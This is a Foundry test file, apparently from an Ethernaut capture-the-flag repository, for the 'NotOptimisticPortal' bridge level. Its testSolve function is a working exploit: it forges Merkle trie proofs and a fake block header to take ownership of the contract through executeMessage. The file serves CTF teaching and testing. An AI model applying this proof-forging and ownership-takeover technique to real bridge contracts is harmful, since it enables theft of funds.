// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {NotOptimisticPortal} from "src/levels/NotOptimisticPortal.sol";
import {NotOptimisticPortalFactory} from "src/levels/NotOptimisticPortalFactory.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {Lib_RLPReader} from "../../src/helpers/lib/rlp/Lib_RLPReader.sol";
import {Lib_SecureMerkleTrie} from "../../src/helpers/lib/trie/Lib_SecureMerkleTrie.sol";
import {Lib_RLPWriter} from "../../src/helpers/lib/rlp/Lib_RLPWriter.sol";
import {MessageReceiver} from "../../src/attacks/NotOptimisticPortalMessageReceiver.sol";

contract TestNotOptimisticPortal is Test, Utils {
    using Lib_RLPReader for bytes;
    using Lib_RLPReader for Lib_RLPReader.RLPItem;
    address public constant L2_TARGET = 0x4242424242424242424242424242424242424242;
    
    Ethernaut ethernaut;
    NotOptimisticPortal instance;

    address payable owner;
    address payable player;

    bytes4 constant ON_MESSAGE_RECEIVED_SELECTOR = bytes4(0x3a69197e);

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        NotOptimisticPortalFactory factory = new NotOptimisticPortalFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = NotOptimisticPortal(payable(createLevelInstance(ethernaut, Level(address(factory)), 0)));
        vm.stopPrank();
    }

    /// @notice Check the initial state of the level and environment.
    function testInit() public {
        vm.startPrank(player);

        assertEq(instance.name(), "CTFToken");
        assertEq(instance.symbol(), "CTFT");
        assertEq(instance.totalSupply(), 0);
        assertEq(instance.sequencer(), address(0));

        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    function testSendMessageRejectsInvalidSelector() public {
        vm.startPrank(player);

        address[] memory receivers = new address[](1);
        receivers[0] = address(this);

        bytes[] memory messageData = new bytes[](1);
        messageData[0] = abi.encodeWithSelector(bytes4(0xdeadbeef), bytes("bad"));

        vm.expectRevert("Message not allowed");
        instance.sendMessage(0, receivers, messageData, 1);
    }

    function testSendMessageRejectsLengthMismatch() public {
        vm.startPrank(player);

        address[] memory receivers = new address[](1);
        receivers[0] = address(this);

        bytes[] memory messageData = new bytes[](0);

        vm.expectRevert("Message array mismatch");
        instance.sendMessage(0, receivers, messageData, 1);
    }

    function testExecuteMessageRejectsLengthMismatch() public {
        vm.startPrank(player);

        address[] memory receivers = new address[](1);
        receivers[0] = address(this);

        bytes[] memory messageData = new bytes[](0);

        NotOptimisticPortal.ProofData memory proofs = NotOptimisticPortal.ProofData({
            stateTrieProof: hex"c0",
            storageTrieProof: hex"c0",
            accountStateRlp: hex"c0"
        });

        vm.expectRevert("Message execution data arrays mismatch");
        instance.executeMessage(player, 1, receivers, messageData, 123, proofs, 0);
    }

    function _leaf(bytes memory compactPath, bytes memory value) internal pure returns (bytes memory) {
        bytes[] memory items = new bytes[](2);
        items[0] = Lib_RLPWriter.writeBytes(compactPath);
        items[1] = Lib_RLPWriter.writeBytes(value);
        return Lib_RLPWriter.writeList(items);
    }

    /**
     * Computes the secure counterpart to a key.
     * @param _key Key to get a secure key from.
     * @return _secureKey Secure version of the key.
     */
    function _getSecureKey(bytes memory _key) private pure returns (bytes memory _secureKey) {
        return abi.encodePacked(keccak256(_key));
    }


    function _verifyMessageInclusion(
        bytes32 messageSlot,
        bytes memory stateTrieProof,
        bytes memory storageTrieProof,
        bytes memory accountStateRlp,
        bytes32 stateRoot
    ) internal view {
        // Verify L2_TARGET in state root
        bool accountVerified = Lib_SecureMerkleTrie.verifyInclusionProof(
            abi.encodePacked(L2_TARGET),
            accountStateRlp,
            stateTrieProof,
            stateRoot
        );
        require(accountVerified, "Invalid account proof");

        // Extract storageRoot
        Lib_RLPReader.RLPItem[] memory accountState = accountStateRlp.toRLPItem().readList();
        
        // Account state is [nonce, balance, storageRoot, codeHash]
        bytes32 storageRoot = accountState[2].readBytes32();

        // Verify message slot in storage root
        bool slotVerified = Lib_SecureMerkleTrie.verifyInclusionProof(
            abi.encodePacked(messageSlot),
            hex"01",
            storageTrieProof,
            storageRoot
        );
        require(slotVerified, "Invalid storage proof");
    }

    // Internal functions
    function _computeMessageSlot(
        address _tokenReceiver,
        uint256 _amount,
        address[] memory _messageReceivers,
        bytes[] memory _messageDatas,
        uint256 _salt
    ) internal pure returns(bytes32){
        bytes32 messageReceiversAccumulatedHash;
        bytes32 messageDatasAccumulatedHash;
        if(_messageReceivers.length != 0){
            for(uint i; i < _messageReceivers.length; i++){
                messageReceiversAccumulatedHash = keccak256(abi.encode(messageReceiversAccumulatedHash, _messageReceivers[i]));
                messageDatasAccumulatedHash = keccak256(abi.encode(messageDatasAccumulatedHash, _messageDatas[i]));
            }
        }
        return keccak256(abi.encode(
            _tokenReceiver,
            _amount,
            messageReceiversAccumulatedHash,
            messageDatasAccumulatedHash,
            _salt
        ));
    }

    function buildStorageProof(
        bytes32 withdrawalHash
    ) private returns (bytes32, bytes memory){

        bytes memory withdrawalHashSecureKey = _getSecureKey(abi.encodePacked(withdrawalHash));
        bytes memory storageLeaf = _leaf(bytes.concat(hex"20", withdrawalHashSecureKey), hex"01"); 
        bytes32 storageRootHash = keccak256(storageLeaf);


        bytes[] memory _storageProof = new bytes[](1);
        _storageProof[0] = Lib_RLPWriter.writeBytes(storageLeaf);
        bytes memory storageProof = Lib_RLPWriter.writeList(_storageProof);  
        return (storageRootHash, storageProof);
    }

    function buildProof(
        bytes32 withdrawalHash
    ) private returns(NotOptimisticPortal.ProofData memory, bytes32){
   
        (bytes32 storageRootHash, bytes memory storageProof) = buildStorageProof(withdrawalHash);

        // Lib_SecureMerkleTrie.verifyInclusionProof(
        //     abi.encodePacked(withdrawalHash),
        //     hex"01",
        //     storageProof,
        //     storageRootHash
        // );
      
        // Account state is [nonce, balance, storageRoot, codeHash]
        // is't a trie
        bytes[] memory _accountState = new bytes[](4);
        _accountState[0] = Lib_RLPWriter.writeUint(0);
        _accountState[1] = Lib_RLPWriter.writeUint(0);
        _accountState[2] = Lib_RLPWriter.writeBytes(abi.encodePacked(storageRootHash));
        _accountState[3] = Lib_RLPWriter.writeBytes("");
        bytes memory accountState = Lib_RLPWriter.writeList(_accountState);

        bytes memory l2TargetSecureKey = _getSecureKey(abi.encodePacked(L2_TARGET));
        bytes memory stateLeaf = _leaf(bytes.concat(hex"20", l2TargetSecureKey), accountState);
        bytes32 stateRootHash = keccak256(stateLeaf);

        bytes[] memory _stateProof = new bytes[](1);
        _stateProof[0] = Lib_RLPWriter.writeBytes(stateLeaf);
        bytes memory stateProof = Lib_RLPWriter.writeList(_stateProof);
        NotOptimisticPortal.ProofData memory proofData = NotOptimisticPortal.ProofData(stateProof, storageProof, accountState);
        return (proofData,stateRootHash);
    }

    /**
     Lib_RLPReader.RLPItem[] memory header = rlpBlockHeader.toRLPItem().readList();

            parentHash = bytes32(header[0].readUint256());
            stateRoot = bytes32(header[3].readUint256());
            number = header[8].readUint256();
            timestamp = header[11].readUint256();
     */
    function _buildRlpBlockHeader(bytes32 parentHash, bytes32 stateRootHash, uint256 blockNumber, uint256 timestamp) internal view returns(bytes memory){
        bytes[] memory blockHeader = new bytes[](12);
        blockHeader[0] = Lib_RLPWriter.writeBytes(abi.encodePacked(parentHash)); // parentHash
        blockHeader[1] = Lib_RLPWriter.writeUint(0); // ommersHash
        blockHeader[2] = Lib_RLPWriter.writeUint(0); // beneficiary
        blockHeader[3] = Lib_RLPWriter.writeBytes(abi.encodePacked(stateRootHash)); // stateRoot
        blockHeader[4] = Lib_RLPWriter.writeUint(0); // transactionsRoot
        blockHeader[5] = Lib_RLPWriter.writeUint(0); // receiptsRoot
        blockHeader[6] = Lib_RLPWriter.writeUint(0); // logsBloom
        blockHeader[7] = Lib_RLPWriter.writeUint(0); // difficulty
        blockHeader[8] = Lib_RLPWriter.writeUint(blockNumber); // number
        blockHeader[9] = Lib_RLPWriter.writeUint(0); // gasLimit
        blockHeader[10] = Lib_RLPWriter.writeUint(0); // gasUsed
        blockHeader[11] = Lib_RLPWriter.writeUint(timestamp); // timestamp
        return Lib_RLPWriter.writeList(blockHeader);
    }
    /// @notice Intentionally left blank.
    function testSolve() public checkSolvedByPlayer{

        MessageReceiver receiver = new MessageReceiver(instance);
        
        address tokenReceiver = player;
        uint256 amount = 1000;
        address[] memory messageReceivers = new address[](1);
        bytes[] memory messageData = new bytes[](1);
        messageReceivers[0] = address(instance);
        messageData[0] = abi.encodeWithSelector(instance.transferOwnership_____610165642.selector, address(receiver));


        uint256 salt = 123;
        bytes32 withdrawalHash = _computeMessageSlot(
            tokenReceiver,
            amount,
            messageReceivers,
            messageData,
            salt
        );
        (NotOptimisticPortal.ProofData memory proofData, bytes32 stateHash) = buildProof(withdrawalHash);
        _verifyMessageInclusion(
            withdrawalHash,
            proofData.stateTrieProof,
            proofData.storageTrieProof,
            proofData.accountStateRlp,
            stateHash
        );


        address[] memory messageReceivers2 = new address[](2);
        bytes[] memory messageData2 = new bytes[](2);
        messageReceivers2[0] = messageReceivers[0];
        messageData2[0] = messageData[0];
        messageReceivers2[1] = address(receiver);
        messageData2[1] = abi.encodeWithSelector(
                receiver.onMessageReceived.selector, 
                _buildRlpBlockHeader(instance.latestBlockHash(), stateHash, instance.latestBlockNumber() + 1, instance.latestBlockTimestamp() + 1)
            );
        instance.executeMessage(tokenReceiver, amount, messageReceivers2, messageData2, salt, proofData, instance.bufferCounter());
        
    }
}
